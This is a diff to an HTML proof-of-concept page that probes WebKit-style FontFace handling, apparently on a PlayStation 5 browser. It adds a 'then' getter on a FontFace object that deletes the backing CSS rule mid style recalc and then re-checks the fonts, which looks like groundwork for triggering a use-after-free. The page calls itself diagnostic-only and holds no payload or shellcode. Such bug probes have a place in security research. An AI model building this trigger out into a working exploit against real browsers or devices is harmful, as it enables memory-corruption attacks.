@@ -4,7 +4,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>CSSFontFace loaded + pre-load recalc isolate</title>
+<title>CSSFontFace loaded + then + pre-load recalc isolate</title>
 <style>
 html {
     font-family: system-ui, -apple-system, sans-serif;
@@ -49,7 +49,7 @@ body {
 </style>
 </head>
 <body>
-<h1>CSSFontFace loaded + pre-load recalc isolate</h1>
+<h1>CSSFontFace loaded + then + pre-load recalc isolate</h1>
 <div class="box warn">
 Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP, no sandbox escape.
 </div>
@@ -68,7 +68,7 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
 <script>
 (function () {
     "use strict";
-    const STORAGE_KEY = "cssfontface-loaded-preload-recalc-isolate-log";
+    const STORAGE_KEY = "cssfontface-loaded-then-preload-recalc-isolate-log";
     const stageElement = document.getElementById("stage");
     const logElement = document.getElementById("log");
     const previousElement = document.getElementById("previous");
@@ -76,6 +76,7 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
     let seq = 0;
     let finished = false;
     let createdFaces = [];
+    let active = null;
     function now() {
         return new Date().toISOString();
     }
@@ -140,6 +141,7 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
         createdFaces = [];
         probe.style.fontFamily = "";
         probe.textContent = "AB";
+        active = null;
     }
     function cssRuleCount(styleElement) {
         try {
@@ -170,6 +172,38 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
         );
         createdFaces.push(face);
         return face;
+    }
+    function makeThenGetter(label) {
+        return function () {
+            log("then getter property read: " + label + ", armed=" + !!(active && active.armed));
+            if (active && active.armed) {
+                active.reentered = true;
+                active.reentryCount++;
+                stage("THEN GETTER FIRED");
+                log("THEN GETTER FIRED from " + label);
+                log("inside getter cssRules=" + cssRuleCount(active.styleElement));
+                try {
+                    const sheet = active.styleElement && active.styleElement.sheet;
+                    if (sheet && sheet.cssRules && sheet.cssRules.length > 0) {
+                        sheet.deleteRule(0);
+                        log("inside getter deleteRule(0) executed");
+                    } else {
+                        log("inside getter deleteRule skipped");
+                    }
+                } catch (e) {
+                    log("inside getter deleteRule threw: " + e.name + ": " + e.message);
+                }
+                log("inside getter after deleteRule cssRules=" + cssRuleCount(active.styleElement));
+                try {
+                    log("inside getter check A=" + document.fonts.check('16px "' + active.family + '"', "A"));
+                    log("inside getter check B=" + document.fonts.check('16px "' + active.family + '"', "B"));
+                    log("inside getter check AB=" + document.fonts.check('16px "' + active.family + '"', "AB"));
+                } catch (e) {
+                    log("inside getter document.fonts.check threw: " + e.name + ": " + e.message);
+                }
+            }
+            return undefined;
+        };
     }
     function checkFonts(label, family) {
         stage(label + " document.fonts.check A");
@@ -218,7 +252,7 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
         } catch (e) {
         }
         stage("ready");
-        log("POC STARTED: CSSFontFace loaded + pre-load recalc isolate");
+        log("POC STARTED: CSSFontFace loaded + then + pre-load recalc isolate");
         cleanup();
         if (!window.FontFace) {
             stage("FontFace API missing");
@@ -232,7 +266,7 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
             finish();
             return;
         }
-        const family = "ps5-loaded-preload-recalc-" + Date.now();
+        const family = "ps5-loaded-then-preload-recalc-" + Date.now();
         stage("create CSS @font-face");
         const styleElement = makeCSSFace(family);
         log("family=" + family);
@@ -240,6 +274,25 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
         stage("create JS FontFace same family");
         const jsFace = makeJSFace(family);
         log("jsFace.status initial=" + jsFace.status);
+        active = {
+            family: family,
+            styleElement: styleElement,
+            armed: false,
+            reentered: false,
+            reentryCount: 0
+        };
+        stage("install own jsFace.then getter");
+        try {
+            Object.defineProperty(jsFace, "then", {
+                configurable: true,
+                get: makeThenGetter("jsFace.then")
+            });
+            log("installed own getter on jsFace.then");
+            log('"then" in jsFace=' + ("then" in jsFace));
+            log("own then descriptor exists=" + !!Object.getOwnPropertyDescriptor(jsFace, "then"));
+        } catch (e) {
+            log("install own getter threw: " + e.name + ": " + e.message);
+        }
         stage("access jsFace.loaded");
         let loadedPromise = null;
         try {
@@ -273,13 +326,18 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
             finish();
             return;
         }
+        active.armed = true;
+        log("armed then getter before checks/recalc");
         checkFonts("before recalc", family);
         log("ABOUT TO FORCE STYLE RECALC");
         forceStyleRecalc("preload");
+        active.armed = false;
+        log("disarmed then getter after recalc");
         stage("after forceStyleRecalc");
         log("after recalc cssRules=" + cssRuleCount(styleElement));
         log("after recalc jsFace.status=" + jsFace.status);
         log("after recalc document.fonts.size=" + document.fonts.size);
+        log("after recalc reentered=" + active.reentered + ", reentryCount=" + active.reentryCount);
         checkFonts("after recalc", family);
         stage("wait for loaded callbacks");
         setTimeout(function () {
@@ -287,6 +345,7 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
             log("final cssRules=" + cssRuleCount(styleElement));
             log("final jsFace.status=" + jsFace.status);
             log("final document.fonts.size=" + document.fonts.size);
+            log("final reentered=" + active.reentered + ", reentryCount=" + active.reentryCount);
             finish();
         }, 1000);
     }
